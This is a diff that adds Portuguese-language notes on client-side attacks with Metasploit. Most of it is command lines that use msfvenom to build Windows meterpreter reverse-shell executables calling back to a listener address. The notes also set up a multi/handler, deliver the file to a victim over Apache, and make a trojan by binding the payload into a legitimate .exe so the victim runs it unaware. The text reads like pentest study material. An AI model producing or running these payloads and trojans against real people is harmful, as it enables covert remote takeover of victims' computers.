@@ -1,2 +1,74 @@
 <<< Os exemplos vistos nesse arquivo são de exploração Client-side>>>
 <<<<<<Ou seja, o Client se conecta no atacante, seja por codigo, arquivo ou phishing malicioso>>>>
+
+msfvenon   (nova versão dos antigos aplicativos payload/ encoder)
+
+tipos de arquivos suportados:
+msfvenon --help-formats
+
+Exportando um payload meterpreter para um arquivo .exe
+msfvenon -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4000 -f exe > arquivo.exe
+  Obs:
+    -p = indica payload usado
+    LHOST = Servidor local para conexão reversa
+    LPORT = Porta do servidor local
+    -f = Formato do arquivo
+
+Para receber a conexão da vitima:
+Abrir o msfconsole:
+msfconsole
+
+Usar o multhandler para aguardar a conexão da vitima:
+use multhandler
+
+setar o payload que usamos no msfvenon:
+set payload windows/meterpreter/reverse_tcp
+
+setar o LHOST e LPORT do servidor local
+
+Iniciar o exploit:
+exploit
+
+####O console ira aguardar a conexão da vitima (execução do .exe) e abrira o meterpreter
+OBS: O procedimento acima é inviavel, pois sera dificil da vitima executar, ja que o aplicativo "arquivo.exe" é suspeito
+------------------------------------
+
+Para transferiri o arquivo para a vitima:
+Ativar o apache (Server Web)
+service apache2 start
+
+copiar o arquivo.exe para o "/" da aplicação web (/var/www/html)
+
+A vitima precisa instalar o aplicativo
+-----------------------------------
+
+CRIANDO CAVALO DE TROIA:
+
+Alguns aplicativos para Windows estão no diretorio: /usr/share/windows-binaries
+-Podem ser utilizados para jogar para vitima e explorar falhas
+-Podemos usar a imaginação para utilizar qualquer arquivo ".exe" para juntar com o payload, deixando o arquivo menos suspeito
+
+Para criar o Payload:
+
+msfvenon -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4000 -x arquivo.exe -k -f exe > arquivo_infectado.exe
+
+  OBS:
+    -p = Indica o payload a ser utilizado
+    -x = Indica o arquivo exe que iremos infectar
+    -k = Informa que iremos fazer o bind (mesclar) para o arquivo infectado
+    -f = Informa o formato do arquivo final
+    > arquivo.exe = Nomeia o arquivo infectado
+    
+Abrir o msfconsole
+use multhandler
+set payload windows/meterpreter/reverse_tcp
+
+Setar o rhost e lhost
+
+Abrir o console de exploit para aguardar conexão da vitima:
+exploit
+
+####Basta de alguma maneira a vitima executar o programa infectado para fechar a conexão e ganhar o acesso
+#####A vitima ira executar o programa normalmente
+!!!! Se a vitima estiver utilizando antivirus, provavelmente o arquivo sera identificado como malicioso.
+
